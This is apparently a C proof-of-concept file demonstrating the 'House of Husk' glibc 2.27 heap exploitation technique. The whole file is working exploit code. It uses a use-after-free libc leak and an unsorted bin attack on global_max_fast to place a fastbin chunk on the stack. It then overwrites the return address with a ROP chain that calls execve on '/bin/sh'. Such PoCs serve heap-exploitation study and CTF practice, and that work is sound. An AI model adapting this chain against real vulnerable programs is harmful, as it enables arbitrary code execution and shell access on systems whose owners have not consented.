/**
 * Loona's method - House of Husk
 * This PoC is supposed to be run with libc-2.27.
 */
#include <stdio.h>
#include <stdlib.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define ENVIRON          0x3ee098
#define LIBC_BINSH       0x1b3e9a
#define LIBC_POP_RDI     0x2155f
#define LIBC_POP_RSI     0x23e6a
#define LIBC_POP_RDX     0x1b96
#define LIBC_EXECVE      0xe4e30

unsigned long libc_base, addr_env, ofs_fake;
char *a[10];
int i;

int main (int argc, char **argv, char **envp)
{
  unsigned long fake_size;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL); // make printf quiet

  ofs_fake = (void*)envp - (void*)&fake_size; /* this is fixed */

  /* leak libc */
  a[0] = malloc(0x500); /* UAF chunk */
  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
  a[2] = malloc(0x500); /* avoid consolidation */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
  printf("libc @ 0x%lx\n", libc_base);

  /* unsorted bin attack */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* overwrite global_max_fast */

  /* leak environ */
  free(a[1]);
  addr_env = *(unsigned long*)a[1];
  printf("environ = 0x%lx\n", addr_env);
  *(unsigned long*)a[1] = addr_env - ofs_fake - 8;

  /* prepare fake size on stack*/
  fake_size = (offset2size(ENVIRON - MAIN_ARENA) + 0x10) | 1;
  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));

  /* overwrite return address */
  a[3] = malloc(offset2size(ENVIRON - MAIN_ARENA));
  for(i = 0; i < 0x20; i++) {
    *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI + 1; /* ret sled */
  }
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDX; i++;
  *(unsigned long*)(a[3] + i*8) = 0; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RSI; i++;
  *(unsigned long*)(a[3] + i*8) = 0; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_BINSH; i++;
  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_EXECVE; i++;
  getchar();

  return 0;
}
